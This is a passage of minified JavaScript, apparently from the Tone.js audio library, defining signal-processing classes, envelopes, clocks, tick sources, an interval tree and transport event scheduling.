t.Add(0),this._scale.connect(this._add),this._setRange()},t.extend(t.Scale,t.SignalBase),Object.defineProperty(t.Scale.prototype,"min",{get:function(){return this._outputMin},set:function(t){this._outputMin=t,this._setRange()}}),Object.defineProperty(t.Scale.prototype,"max",{get:function(){return this._outputMax},set:function(t){this._outputMax=t,this._setRange()}}),t.Scale.prototype._setRange=function(){this._add.value=this._outputMin,this._scale.value=this._outputMax-this._outputMin},t.Scale.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._add.dispose(),this._add=null,this._scale.dispose(),this._scale=null,this},t.Scale})),n((function(t){return t.ScaleExp=function(e,n,r){t.SignalBase.call(this),this._scale=this.output=new t.Scale(e,n),this._exp=this.input=new t.Pow(t.defaultArg(r,2)),this._exp.connect(this._scale)},t.extend(t.ScaleExp,t.SignalBase),Object.defineProperty(t.ScaleExp.prototype,"exponent",{get:function(){return this._exp.value},set:function(t){this._exp.value=t}}),Object.defineProperty(t.ScaleExp.prototype,"min",{get:function(){return this._scale.min},set:function(t){this._scale.min=t}}),Object.defineProperty(t.ScaleExp.prototype,"max",{get:function(){return this._scale.max},set:function(t){this._scale.max=t}}),t.ScaleExp.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._scale.dispose(),this._scale=null,this._exp.dispose(),this._exp=null,this},t.ScaleExp})),n((function(t){return t.Delay=function(){var e=t.defaults(arguments,["delayTime","maxDelay"],t.Delay);t.AudioNode.call(this),this._maxDelay=Math.max(this.toSeconds(e.maxDelay),this.toSeconds(e.delayTime)),this._delayNode=this.input=this.output=this.context.createDelay(this._maxDelay),this.delayTime=new t.Param({param:this._delayNode.delayTime,units:t.Type.Time,value:e.delayTime}),this._readOnly("delayTime")},t.extend(t.Delay,t.AudioNode),t.Delay.defaults={maxDelay:1,delayTime:0},Object.defineProperty(t.Delay.prototype,"maxDelay",{get:function(){return this._maxDelay}}),t.Delay.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._delayNode.disconnect(),this._delayNode=null,this._writable("delayTime"),this.delayTime=null,this},t.Delay})),n((function(t){return t.FeedbackCombFilter=function(){var e=t.defaults(arguments,["delayTime","resonance"],t.FeedbackCombFilter);t.AudioNode.call(this),this._delay=this.input=this.output=new t.Delay(e.delayTime),this.delayTime=this._delay.delayTime,this._feedback=new t.Gain(e.resonance,t.Type.NormalRange),this.resonance=this._feedback.gain,this._delay.chain(this._feedback,this._delay),this._readOnly(["resonance","delayTime"])},t.extend(t.FeedbackCombFilter,t.AudioNode),t.FeedbackCombFilter.defaults={delayTime:.1,resonance:.5},t.FeedbackCombFilter.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._writable(["resonance","delayTime"]),this._delay.dispose(),this._delay=null,this.delayTime=null,this._feedback.dispose(),this._feedback=null,this.resonance=null,this},t.FeedbackCombFilter})),n((function(t){return t.FFT=function(){var e=t.defaults(arguments,["size"],t.FFT);e.type=t.Analyser.Type.FFT,t.AudioNode.call(this),this._analyser=this.input=this.output=new t.Analyser(e)},t.extend(t.FFT,t.AudioNode),t.FFT.defaults={size:1024},t.FFT.prototype.getValue=function(){return this._analyser.getValue()},Object.defineProperty(t.FFT.prototype,"size",{get:function(){return this._analyser.size},set:function(t){this._analyser.size=t}}),t.FFT.prototype.dispose=function(){t.AudioNode.prototype.dispose.call(this),this._analyser.dispose(),this._analyser=null},t.FFT})),n((function(t){return t.Abs=function(){t.SignalBase.call(this),this._abs=this.input=this.output=new t.WaveShaper((function(t){return Math.abs(t)<.001?0:Math.abs(t)}),1024)},t.extend(t.Abs,t.SignalBase),t.Abs.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._abs.dispose(),this._abs=null,this},t.Abs})),n((function(t){return t.Follower=function(){var e=t.defaults(arguments,["attack","release"],t.Follower);t.AudioNode.call(this),this.createInsOuts(1,1),this._abs=new t.Abs,this._filter=this.context.createBiquadFilter(),this._filter.type="lowpass",this._filter.frequency.value=0,this._filter.Q.value=-100,this._frequencyValues=new t.WaveShaper,this._sub=new t.Subtract,this._delay=new t.Delay(this.blockTime),this._mult=new t.Multiply(1e4),this._attack=e.attack,this._release=e.release,this.input.chain(this._abs,this._filter,this.output),this._abs.connect(this._sub,0,1),this._filter.chain(this._delay,this._sub),this._sub.chain(this._mult,this._frequencyValues,this._filter.frequency),this._setAttackRelease(this._attack,this._release)},t.extend(t.Follower,t.AudioNode),t.Follower.defaults={attack:.05,release:.5},t.Follower.prototype._setAttackRelease=function(e,n){var r=this.blockTime;e=t.Time(e).toFrequency(),n=t.Time(n).toFrequency(),e=Math.max(e,r),n=Math.max(n,r),this._frequencyValues.setMap((function(t){return t<=0?e:n}))},Object.defineProperty(t.Follower.prototype,"attack",{get:function(){return this._attack},set:function(t){this._attack=t,this._setAttackRelease(this._attack,this._release)}}),Object.defineProperty(t.Follower.prototype,"release",{get:function(){return this._release},set:function(t){this._release=t,this._setAttackRelease(this._attack,this._release)}}),t.Follower.prototype.connect=t.SignalBase.prototype.connect,t.Follower.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._filter.disconnect(),this._filter=null,this._frequencyValues.disconnect(),this._frequencyValues=null,this._delay.dispose(),this._delay=null,this._sub.disconnect(),this._sub=null,this._abs.dispose(),this._abs=null,this._mult.dispose(),this._mult=null,this._curve=null,this},t.Follower})),n((function(t){return t.ScaledEnvelope=function(){var e=t.defaults(arguments,["attack","decay","sustain","release"],t.Envelope);t.Envelope.call(this,e),e=t.defaultArg(e,t.ScaledEnvelope.defaults),this._exp=this.output=new t.Pow(e.exponent),this._scale=this.output=new t.Scale(e.min,e.max),this._sig.chain(this._exp,this._scale)},t.extend(t.ScaledEnvelope,t.Envelope),t.ScaledEnvelope.defaults={min:0,max:1,exponent:1},Object.defineProperty(t.ScaledEnvelope.prototype,"min",{get:function(){return this._scale.min},set:function(t){this._scale.min=t}}),Object.defineProperty(t.ScaledEnvelope.prototype,"max",{get:function(){return this._scale.max},set:function(t){this._scale.max=t}}),Object.defineProperty(t.ScaledEnvelope.prototype,"exponent",{get:function(){return this._exp.value},set:function(t){this._exp.value=t}}),t.ScaledEnvelope.prototype.dispose=function(){return t.Envelope.prototype.dispose.call(this),this._scale.dispose(),this._scale=null,this._exp.dispose(),this._exp=null,this},t.ScaledEnvelope})),n((function(t){return t.FrequencyEnvelope=function(){var e=t.defaults(arguments,["attack","decay","sustain","release"],t.Envelope);t.ScaledEnvelope.call(this,e),e=t.defaultArg(e,t.FrequencyEnvelope.defaults),this._octaves=e.octaves,this.baseFrequency=e.baseFrequency,this.octaves=e.octaves},t.extend(t.FrequencyEnvelope,t.Envelope),t.FrequencyEnvelope.defaults={baseFrequency:200,octaves:4,exponent:2},Object.defineProperty(t.FrequencyEnvelope.prototype,"baseFrequency",{get:function(){return this._scale.min},set:function(t){this._scale.min=this.toFrequency(t),this.octaves=this._octaves}}),Object.defineProperty(t.FrequencyEnvelope.prototype,"octaves",{get:function(){return this._octaves},set:function(t){this._octaves=t,this._scale.max=this.baseFrequency*Math.pow(2,t)}}),Object.defineProperty(t.FrequencyEnvelope.prototype,"exponent",{get:function(){return this._exp.value},set:function(t){this._exp.value=t}}),t.FrequencyEnvelope.prototype.dispose=function(){return t.ScaledEnvelope.prototype.dispose.call(this),this},t.FrequencyEnvelope})),n((function(t){return t.GreaterThanZero=function(){t.SignalBase.call(this),this._thresh=this.output=new t.WaveShaper((function(t){return t<=0?0:1}),127),this._scale=this.input=new t.Multiply(1e4),this._scale.connect(this._thresh)},t.extend(t.GreaterThanZero,t.SignalBase),t.GreaterThanZero.prototype.dispose=function(){return t.SignalBase.prototype.dispose.call(this),this._scale.dispose(),this._scale=null,this._thresh.dispose(),this._thresh=null,this},t.GreaterThanZero})),n((function(t){return t.GreaterThan=function(e){t.Signal.call(this),this.createInsOuts(2,0),this._param=this.input[0]=new t.Subtract(e),this.input[1]=this._param.input[1],this._gtz=this.output=new t.GreaterThanZero,this._param.connect(this._gtz)},t.extend(t.GreaterThan,t.Signal),t.GreaterThan.prototype.dispose=function(){return t.Signal.prototype.dispose.call(this),this._gtz.dispose(),this._gtz=null,this},t.GreaterThan})),n((function(t){return t.Gate=function(){var e=t.defaults(arguments,["threshold","attack","release"],t.Gate);t.AudioNode.call(this),this.createInsOuts(1,1),this._follower=new t.Follower(e.attack,e.release),this._gt=new t.GreaterThan(t.dbToGain(e.threshold)),this.input.connect(this.output),this.input.chain(this._gt,this._follower,this.output.gain)},t.extend(t.Gate,t.AudioNode),t.Gate.defaults={attack:.1,release:.1,threshold:-40},Object.defineProperty(t.Gate.prototype,"threshold",{get:function(){return t.gainToDb(this._gt.value)},set:function(e){this._gt.value=t.dbToGain(e)}}),Object.defineProperty(t.Gate.prototype,"attack",{get:function(){return this._follower.attack},set:function(t){this._follower.attack=t}}),Object.defineProperty(t.Gate.prototype,"release",{get:function(){return this._follower.release},set:function(t){this._follower.release=t}}),t.Gate.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._follower.dispose(),this._gt.dispose(),this._follower=null,this._gt=null,this},t.Gate})),n((function(t){function e(t){return function(e,n){n=this.toSeconds(n),t.apply(this,arguments);var r=this._events.get(n),i=this._events.previousEvent(r),o=this._getTicksUntilEvent(i,n);return r.ticks=Math.max(o,0),this}}return t.TickSignal=function(e){e=t.defaultArg(e,1),t.Signal.call(this,{units:t.Type.Ticks,value:e}),this._events.memory=1/0,this.cancelScheduledValues(0),this._events.add({type:t.Param.AutomationType.SetValue,time:0,value:e})},t.extend(t.TickSignal,t.Signal),t.TickSignal.prototype.setValueAtTime=e(t.Signal.prototype.setValueAtTime),t.TickSignal.prototype.linearRampToValueAtTime=e(t.Signal.prototype.linearRampToValueAtTime),t.TickSignal.prototype.setTargetAtTime=function(t,e,n){e=this.toSeconds(e),this.setRampPoint(e),t=this._fromUnits(t);for(var r=this._events.get(e),i=Math.round(Math.max(1/n,1)),o=0;o<=i;o++){var s=n*o+e,a=this._exponentialApproach(r.time,r.value,t,n,s);this.linearRampToValueAtTime(this._toUnits(a),s)}return this},t.TickSignal.prototype.exponentialRampToValueAtTime=function(t,e){e=this.toSeconds(e),t=this._fromUnits(t);var n=this._events.get(e);null===n&&(n={value:this._initialValue,time:0});for(var r=Math.round(Math.max(10*(e-n.time),1)),i=(e-n.time)/r,o=0;o<=r;o++){var s=i*o+n.time,a=this._exponentialInterpolate(n.time,n.value,e,t,s);this.linearRampToValueAtTime(this._toUnits(a),s)}return this},t.TickSignal.prototype._getTicksUntilEvent=function(e,n){if(null===e)e={ticks:0,time:0};else if(t.isUndef(e.ticks)){var r=this._events.previousEvent(e);e.ticks=this._getTicksUntilEvent(r,e.time)}var i=this.getValueAtTime(e.time),o=this.getValueAtTime(n);return this._events.get(n).time===n&&this._events.get(n).type===t.Param.AutomationType.SetValue&&(o=this.getValueAtTime(n-this.sampleTime)),.5*(n-e.time)*(i+o)+e.ticks},t.TickSignal.prototype.getTicksAtTime=function(t){t=this.toSeconds(t);var e=this._events.get(t);return Math.max(this._getTicksUntilEvent(e,t),0)},t.TickSignal.prototype.getDurationOfTicks=function(t,e){e=this.toSeconds(e);var n=this.getTicksAtTime(e);return this.getTimeOfTick(n+t)-e},t.TickSignal.prototype.getTimeOfTick=function(e){var n=this._events.get(e,"ticks"),r=this._events.getAfter(e,"ticks");if(n&&n.ticks===e)return n.time;if(n&&r&&r.type===t.Param.AutomationType.Linear&&n.value!==r.value){var i=this.getValueAtTime(n.time),o=(this.getValueAtTime(r.time)-i)/(r.time-n.time),s=Math.sqrt(Math.pow(i,2)-2*o*(n.ticks-e)),a=(-i+s)/o;return(a>0?a:(-i-s)/o)+n.time}return n?0===n.value?1/0:n.time+(e-n.ticks)/n.value:e/this._initialValue},t.TickSignal.prototype.ticksToTime=function(e,n){return n=this.toSeconds(n),new t.Time(this.getDurationOfTicks(e,n))},t.TickSignal.prototype.timeToTicks=function(e,n){n=this.toSeconds(n),e=this.toSeconds(e);var r=this.getTicksAtTime(n),i=this.getTicksAtTime(n+e);return new t.Ticks(i-r)},t.TickSignal})),n((function(t){return t.TimelineState=function(e){t.Timeline.call(this),this._initial=e},t.extend(t.TimelineState,t.Timeline),t.TimelineState.prototype.getValueAtTime=function(t){var e=this.get(t);return null!==e?e.state:this._initial},t.TimelineState.prototype.setStateAtTime=function(t,e){return this.add({state:t,time:e}),this},t.TimelineState.prototype.getLastState=function(t,e){e=this.toSeconds(e);for(var n=this._search(e);n>=0;n--){var r=this._timeline[n];if(r.state===t)return r}},t.TimelineState.prototype.getNextState=function(t,e){e=this.toSeconds(e);var n=this._search(e);if(-1!==n)for(var r=n;r<this._timeline.length;r++){var i=this._timeline[r];if(i.state===t)return i}},t.TimelineState})),n((function(t){return t.TickSource=function(){var e=t.defaults(arguments,["frequency"],t.TickSource);this.frequency=new t.TickSignal(e.frequency,t.Type.Frequency),this._readOnly("frequency"),this._state=new t.TimelineState(t.State.Stopped),this._state.setStateAtTime(t.State.Stopped,0),this._tickOffset=new t.Timeline,this.setTicksAtTime(0,0)},t.extend(t.TickSource),t.TickSource.defaults={frequency:1},Object.defineProperty(t.TickSource.prototype,"state",{get:function(){return this._state.getValueAtTime(this.now())}}),t.TickSource.prototype.start=function(e,n){return e=this.toSeconds(e),this._state.getValueAtTime(e)!==t.State.Started&&(this._state.setStateAtTime(t.State.Started,e),t.isDefined(n)&&this.setTicksAtTime(n,e)),this},t.TickSource.prototype.stop=function(e){if(e=this.toSeconds(e),this._state.getValueAtTime(e)===t.State.Stopped){var n=this._state.get(e);n.time>0&&(this._tickOffset.cancel(n.time),this._state.cancel(n.time))}return this._state.cancel(e),this._state.setStateAtTime(t.State.Stopped,e),this.setTicksAtTime(0,e),this},t.TickSource.prototype.pause=function(e){return e=this.toSeconds(e),this._state.getValueAtTime(e)===t.State.Started&&this._state.setStateAtTime(t.State.Paused,e),this},t.TickSource.prototype.cancel=function(t){return t=this.toSeconds(t),this._state.cancel(t),this._tickOffset.cancel(t),this},t.TickSource.prototype.getTicksAtTime=function(e){e=this.toSeconds(e);var n=this._state.getLastState(t.State.Stopped,e),r={state:t.State.Paused,time:e};this._state.add(r);var i=n,o=0;return this._state.forEachBetween(n.time,e+this.sampleTime,function(e){var n=i.time,r=this._tickOffset.get(e.time);r.time>=i.time&&(o=r.ticks,n=r.time),i.state===t.State.Started&&e.state!==t.State.Started&&(o+=this.frequency.getTicksAtTime(e.time)-this.frequency.getTicksAtTime(n)),i=e}.bind(this)),this._state.remove(r),o},Object.defineProperty(t.TickSource.prototype,"ticks",{get:function(){return this.getTicksAtTime(this.now())},set:function(t){this.setTicksAtTime(t,this.now())}}),Object.defineProperty(t.TickSource.prototype,"seconds",{get:function(){return this.getSecondsAtTime(this.now())},set:function(t){var e=this.now(),n=this.frequency.timeToTicks(t,e);this.setTicksAtTime(n,e)}}),t.TickSource.prototype.getSecondsAtTime=function(e){e=this.toSeconds(e);var n=this._state.getLastState(t.State.Stopped,e),r={state:t.State.Paused,time:e};this._state.add(r);var i=n,o=0;return this._state.forEachBetween(n.time,e+this.sampleTime,function(e){var n=i.time,r=this._tickOffset.get(e.time);r.time>=i.time&&(o=r.seconds,n=r.time),i.state===t.State.Started&&e.state!==t.State.Started&&(o+=e.time-n),i=e}.bind(this)),this._state.remove(r),o},t.TickSource.prototype.setTicksAtTime=function(t,e){return e=this.toSeconds(e),this._tickOffset.cancel(e),this._tickOffset.add({time:e,ticks:t,seconds:this.frequency.getDurationOfTicks(t,e)}),this},t.TickSource.prototype.getStateAtTime=function(t){return t=this.toSeconds(t),this._state.getValueAtTime(t)},t.TickSource.prototype.getTimeOfTick=function(e,n){n=t.defaultArg(n,this.now());var r=this._tickOffset.get(n),i=this._state.get(n),o=Math.max(r.time,i.time),s=this.frequency.getTicksAtTime(o)+e-r.ticks;return this.frequency.getTimeOfTick(s)},t.TickSource.prototype.forEachTickBetween=function(e,n,r){var i=this._state.get(e);if(this._state.forEachBetween(e,n,function(n){i.state===t.State.Started&&n.state!==t.State.Started&&this.forEachTickBetween(Math.max(i.time,e),n.time-this.sampleTime,r),i=n}.bind(this)),e=Math.max(i.time,e),i.state===t.State.Started&&this._state){var o=this.frequency.getTicksAtTime(e),s=(o-this.frequency.getTicksAtTime(i.time))%1;0!==s&&(s=1-s);for(var a=this.frequency.getTimeOfTick(o+s),u=null;a<n&&this._state;){try{r(a,Math.round(this.getTicksAtTime(a)))}catch(t){u=t;break}this._state&&(a+=this.frequency.getDurationOfTicks(1,a))}}if(u)throw u;return this},t.TickSource.prototype.dispose=function(){return t.Param.prototype.dispose.call(this),this._state.dispose(),this._state=null,this._tickOffset.dispose(),this._tickOffset=null,this._writable("frequency"),this.frequency.dispose(),this.frequency=null,this},t.TickSource})),n((function(t){return t.Clock=function(){var e=t.defaults(arguments,["callback","frequency"],t.Clock);t.Emitter.call(this),this.callback=e.callback,this._nextTick=0,this._tickSource=new t.TickSource(e.frequency),this._lastUpdate=0,this.frequency=this._tickSource.frequency,this._readOnly("frequency"),this._state=new t.TimelineState(t.State.Stopped),this._state.setStateAtTime(t.State.Stopped,0),this._boundLoop=this._loop.bind(this),this.context.on("tick",this._boundLoop)},t.extend(t.Clock,t.Emitter),t.Clock.defaults={callback:t.noOp,frequency:1},Object.defineProperty(t.Clock.prototype,"state",{get:function(){return this._state.getValueAtTime(this.now())}}),t.Clock.prototype.start=function(e,n){return e=this.toSeconds(e),this._state.getValueAtTime(e)!==t.State.Started&&(this._state.setStateAtTime(t.State.Started,e),this._tickSource.start(e,n),e<this._lastUpdate&&this.emit("start",e,n)),this},t.Clock.prototype.stop=function(e){return e=this.toSeconds(e),this._state.cancel(e),this._state.setStateAtTime(t.State.Stopped,e),this._tickSource.stop(e),e<this._lastUpdate&&this.emit("stop",e),this},t.Clock.prototype.pause=function(e){return e=this.toSeconds(e),this._state.getValueAtTime(e)===t.State.Started&&(this._state.setStateAtTime(t.State.Paused,e),this._tickSource.pause(e),e<this._lastUpdate&&this.emit("pause",e)),this},Object.defineProperty(t.Clock.prototype,"ticks",{get:function(){return Math.ceil(this.getTicksAtTime(this.now()))},set:function(t){this._tickSource.ticks=t}}),Object.defineProperty(t.Clock.prototype,"seconds",{get:function(){return this._tickSource.seconds},set:function(t){this._tickSource.seconds=t}}),t.Clock.prototype.getSecondsAtTime=function(t){return this._tickSource.getSecondsAtTime(t)},t.Clock.prototype.setTicksAtTime=function(t,e){return this._tickSource.setTicksAtTime(t,e),this},t.Clock.prototype.getTicksAtTime=function(t){return this._tickSource.getTicksAtTime(t)},t.Clock.prototype.nextTickTime=function(t,e){e=this.toSeconds(e);var n=this.getTicksAtTime(e);return this._tickSource.getTimeOfTick(n+t,e)},t.Clock.prototype._loop=function(){var e=this._lastUpdate,n=this.now();this._lastUpdate=n,e!==n&&(this._state.forEachBetween(e,n,function(e){switch(e.state){case t.State.Started:var n=this._tickSource.getTicksAtTime(e.time);this.emit("start",e.time,n);break;case t.State.Stopped:0!==e.time&&this.emit("stop",e.time);break;case t.State.Paused:this.emit("pause",e.time)}}.bind(this)),this._tickSource.forEachTickBetween(e,n,function(t,e){this.callback(t,e)}.bind(this)))},t.Clock.prototype.getStateAtTime=function(t){return t=this.toSeconds(t),this._state.getValueAtTime(t)},t.Clock.prototype.dispose=function(){t.Emitter.prototype.dispose.call(this),this.context.off("tick",this._boundLoop),this._writable("frequency"),this._tickSource.dispose(),this._tickSource=null,this.frequency=null,this._boundLoop=null,this._nextTick=1/0,this.callback=null,this._state.dispose(),this._state=null},t.Clock})),n((function(t){t.IntervalTimeline=function(){t.call(this),this._root=null,this._length=0},t.extend(t.IntervalTimeline),t.IntervalTimeline.prototype.add=function(n){if(t.isUndef(n.time)||t.isUndef(n.duration))throw new Error("Tone.IntervalTimeline: events must have time and duration parameters");n.time=n.time.valueOf();var r=new e(n.time,n.time+n.duration,n);for(null===this._root?this._root=r:this._root.insert(r),this._length++;null!==r;)r.updateHeight(),r.updateMax(),this._rebalance(r),r=r.parent;return this},t.IntervalTimeline.prototype.remove=function(t){if(null!==this._root){var e=[];this._root.search(t.time,e);for(var n=0;n<e.length;n++){var r=e[n];if(r.event===t){this._removeNode(r),this._length--;break}}}return this},Object.defineProperty(t.IntervalTimeline.prototype,"length",{get:function(){return this._length}}),t.IntervalTimeline.prototype.cancel=function(t){return this.forEachFrom(t,function(t){this.remove(t)}.bind(this)),this},t.IntervalTimeline.prototype._setRoot=function(t){this._root=t,null!==this._root&&(this._root.parent=null)},t.IntervalTimeline.prototype._replaceNodeInParent=function(t,e){null!==t.parent?(t.isLeftChild()?t.parent.left=e:t.parent.right=e,this._rebalance(t.parent)):this._setRoot(e)},t.IntervalTimeline.prototype._removeNode=function(t){if(null===t.left&&null===t.right)this._replaceNodeInParent(t,null);else if(null===t.right)this._replaceNodeInParent(t,t.left);else if(null===t.left)this._replaceNodeInParent(t,t.right);else{var e,n;if(t.getBalance()>0)if(null===t.left.right)(e=t.left).right=t.right,n=e;else{for(e=t.left.right;null!==e.right;)e=e.right;e.parent.right=e.left,n=e.parent,e.left=t.left,e.right=t.right}else if(null===t.right.left)(e=t.right).left=t.left,n=e;else{for(e=t.right.left;null!==e.left;)e=e.left;e.parent=e.parent,e.parent.left=e.right,n=e.parent,e.left=t.left,e.right=t.right}null!==t.parent?t.isLeftChild()?t.parent.left=e:t.parent.right=e:this._setRoot(e),this._rebalance(n)}t.dispose()},t.IntervalTimeline.prototype._rotateLeft=function(t){var e=t.parent,n=t.isLeftChild(),r=t.right;t.right=r.left,r.left=t,null!==e?n?e.left=r:e.right=r:this._setRoot(r)},t.IntervalTimeline.prototype._rotateRight=function(t){var e=t.parent,n=t.isLeftChild(),r=t.left;t.left=r.right,r.right=t,null!==e?n?e.left=r:e.right=r:this._setRoot(r)},t.IntervalTimeline.prototype._rebalance=function(t){var e=t.getBalance();e>1?t.left.getBalance()<0?this._rotateLeft(t.left):this._rotateRight(t):e<-1&&(t.right.getBalance()>0?this._rotateRight(t.right):this._rotateLeft(t))},t.IntervalTimeline.prototype.get=function(t){if(null!==this._root){var e=[];if(this._root.search(t,e),e.length>0){for(var n=e[0],r=1;r<e.length;r++)e[r].low>n.low&&(n=e[r]);return n.event}}return null},t.IntervalTimeline.prototype.forEach=function(t){if(null!==this._root){var e=[];this._root.traverse((function(t){e.push(t)}));for(var n=0;n<e.length;n++){var r=e[n].event;r&&t(r)}}return this},t.IntervalTimeline.prototype.forEachAtTime=function(t,e){if(null!==this._root){var n=[];this._root.search(t,n);for(var r=n.length-1;r>=0;r--){var i=n[r].event;i&&e(i)}}return this},t.IntervalTimeline.prototype.forEachFrom=function(t,e){if(null!==this._root){var n=[];this._root.searchAfter(t,n);for(var r=n.length-1;r>=0;r--)e(n[r].event)}return this},t.IntervalTimeline.prototype.dispose=function(){var t=[];null!==this._root&&this._root.traverse((function(e){t.push(e)}));for(var e=0;e<t.length;e++)t[e].dispose();return t=null,this._root=null,this};var e=function(t,e,n){this.event=n,this.low=t,this.high=e,this.max=this.high,this._left=null,this._right=null,this.parent=null,this.height=0};return e.prototype.insert=function(t){t.low<=this.low?null===this.left?this.left=t:this.left.insert(t):null===this.right?this.right=t:this.right.insert(t)},e.prototype.search=function(t,e){t>this.max||(null!==this.left&&this.left.search(t,e),this.low<=t&&this.high>t&&e.push(this),this.low>t||null!==this.right&&this.right.search(t,e))},e.prototype.searchAfter=function(t,e){this.low>=t&&(e.push(this),null!==this.left&&this.left.searchAfter(t,e)),null!==this.right&&this.right.searchAfter(t,e)},e.prototype.traverse=function(t){t(this),null!==this.left&&this.left.traverse(t),null!==this.right&&this.right.traverse(t)},e.prototype.updateHeight=function(){null!==this.left&&null!==this.right?this.height=Math.max(this.left.height,this.right.height)+1:null!==this.right?this.height=this.right.height+1:null!==this.left?this.height=this.left.height+1:this.height=0},e.prototype.updateMax=function(){this.max=this.high,null!==this.left&&(this.max=Math.max(this.max,this.left.max)),null!==this.right&&(this.max=Math.max(this.max,this.right.max))},e.prototype.getBalance=function(){var t=0;return null!==this.left&&null!==this.right?t=this.left.height-this.right.height:null!==this.left?t=this.left.height+1:null!==this.right&&(t=-(this.right.height+1)),t},e.prototype.isLeftChild=function(){return null!==this.parent&&this.parent.left===this},Object.defineProperty(e.prototype,"left",{get:function(){return this._left},set:function(t){this._left=t,null!==t&&(t.parent=this),this.updateHeight(),this.updateMax()}}),Object.defineProperty(e.prototype,"right",{get:function(){return this._right},set:function(t){this._right=t,null!==t&&(t.parent=this),this.updateHeight(),this.updateMax()}}),e.prototype.dispose=function(){this.parent=null,this._left=null,this._right=null,this.event=null},t.IntervalTimeline})),n((function(t){return t.Ticks=function(e,n){if(!(this instanceof t.Ticks))return new t.Ticks(e,n);t.TransportTime.call(this,e,n)},t.extend(t.Ticks,t.TransportTime),t.Ticks.prototype._defaultUnits="i",t.Ticks.prototype._now=function(){return t.Transport.ticks},t.Ticks.prototype._beatsToUnits=function(t){return this._getPPQ()*t},t.Ticks.prototype._secondsToUnits=function(t){return t/(60/this._getBpm())*this._getPPQ()},t.Ticks.prototype._ticksToUnits=function(t){return t},t.Ticks.prototype.toTicks=function(){return this.valueOf()},t.Ticks.prototype.toSeconds=function(){return this.valueOf()/this._getPPQ()*(60/this._getBpm())},t.Ticks})),n((function(t){return t.TransportEvent=function(e,n){n=t.defaultArg(n,t.TransportEvent.defaults),t.call(this),this.Transport=e,this.id=t.TransportEvent._eventId++,this.time=t.Ticks(n.time),this.callback=n.callback,this._once=n.once},t.extend(t.TransportEvent),t.TransportEvent.defaults={once:!1,callback:t.noOp},t.TransportEvent._eventId=0,t.TransportEvent.prototype.invoke=function(t){this.callback&&(this.callback(t),this._once&&this.Transport&&this.Transport.clear(this.id))},t.TransportEvent.prototype.dispose=function(){return t.prototype.dispose.call(this),this.Transport=null,this.callback=null,this.time=null,this},t.TransportEvent})),n((function(t){return t.TransportRepeatEvent=function(e,n){t.TransportEvent.call(this,e,n),n=t.defaultArg(n,t.TransportRepeatEvent.defaults),this.duration=t.Ticks(n.duration),this._interval=t.Ticks(n.interval),this._currentId=-1,this._nextId=-1,this._nextTick=this.time,this._boundRestart=this._restart.bind(this),this.Transport.on("start loopStart",this._boundRestart),this._restart()},t.extend(t.TransportRepeatEvent,t.TransportEvent),t.TransportRepeatEvent.defaults={duration:1/0,interval:1},t.TransportRepeatEvent.prototype.invoke=function(e){this._createEvents(e),t.TransportEvent.prototype.invoke.call(this,e)},t.TransportRepeatEvent.prototype._createEvents=function(e){var n=this.Transport.getTicksAtTime(e);n>=this.time&&n>=this._nextTick&&this._nextTick+this._interval<this.time+this.duration&&(this._nextTick+=this._interval,this._currentId=this._nextId,this._nextId=this.Transport.scheduleOnce(this.invoke.bind(this),t.Ticks(this._nextTick)))},t.TransportRepeatEvent.prototype._restart=function(e){this.Transport.clear(this._currentId),this.Transport.clear(this._nextId),this._nextTick=this.time;var n=this.Transport.getTicksAtTime(e);n>this.time&&(this._nextTick=this.time+Math.ceil((n-this.time)/this._interval)*this._interval),this._currentId=this.Transport.scheduleOnce(this.invoke.bind(this),t.Ticks(this._nextTick)),this._nextTick+=this._interval,this._nextId=this.Transport.scheduleOnce(this.invoke.bind(this),t.Ticks(this._nextTick))},t.TransportRepeatEvent.prototype.dispose=function(){return this.Transport.clear(this._currentId),this.Transport.clear(this._nextId),this.Transport.off("start loopStart",this._boundRestart),this._boundCreateEvents=null,t.TransportEvent.prototype.dispose.call(this),this.duration=null,this._interval=null,this},t.TransportRepeatEvent})),n((function(t){t.Transport=function(){t.Emitter.call(this),t.getContext(function(){this.loop=!1,this._loopStart=0,this._loopEnd=0,this._ppq=e.defaults.PPQ,this._clock=new t.Clock({callback:this._processTick.bind(this),frequency:0}),this._bindClockEvents(),this.bpm=this._clock.frequency,this.bpm._toUnits=this._toUnits.bind(this),this.bpm._fromUnits=this._fromUnits.bind(this),this.bpm.units=t.Type.BPM,this.bpm.value=e.defaults.bpm,this._readOnly("bpm"),this._timeSignature=e.defaults.timeSignature,this._scheduledEvents={},this._timeline=new t.Timeline,this._repeatedEvents=new t.IntervalTimeline,this._syncedSignals=[],this._swingTicks=e.defaults.PPQ/2,this._swingAmount=0}.bind(this))},t.extend(t.Transport,t.Emitter),t.Transport.defaults={bpm:120,swing:0,swingSubdivision:"8n",timeSignature:4,loopStart:0,loopEnd:"4m",PPQ:192},t.Transport.prototype._processTick=function(e,n){if(this._swingAmount>0&&n%this._ppq!=0&&n%(2*this._swingTicks)!=0){var r=n%(2*this._swingTicks)/(2*this._swingTicks),i=Math.sin(r*Math.PI)*this._swingAmount;e+=t.Ticks(2*this._swingTicks/3).toSeconds()*i}this.loop&&n>=this._loopEnd&&(this.emit("loopEnd",e),this._clock.setTicksAtTime(this._loopStart,e),n=this._loopStart,this.emit("loopStart",e,this._clock.getSecondsAtTime(e)),this.emit("loop",e)),this._timeline.forEachAtTime(n,(function(t){t.invoke(e)}))},t.Transport.prototype.schedule=function(e,n){var r=new t.TransportEvent(this,{time:t.TransportTime(n),callback:e});return this._addEvent(r,this._timeline)},t.Transport.prototype.scheduleRepeat=function(e,n,r,i){var o=new t.TransportRepeatEvent(this,{callback:e,interval:t.Time(n),time:t.TransportTime(r),duration:t.Time(t.defaultArg(i,1/0))});return this._addEvent(o,this._repeatedEvents)},t.Transport.prototype.scheduleOnce=function(e,n){var r=new t.TransportEvent(this,{time:t.TransportTime(n),callback:e,once:!0});return this._addEvent(r,this._timeline)},t.Transport.prototype.clear=function(t){if(this._scheduledEvents.hasOwnProperty(t)){var e=this._scheduledEvents[t.toString()];e.timeline.remove(e.event),e.event.dispose(),delete this._scheduledEvents[t.toString()]}return this},t.Transport.prototype._addEvent=function(t,e){return 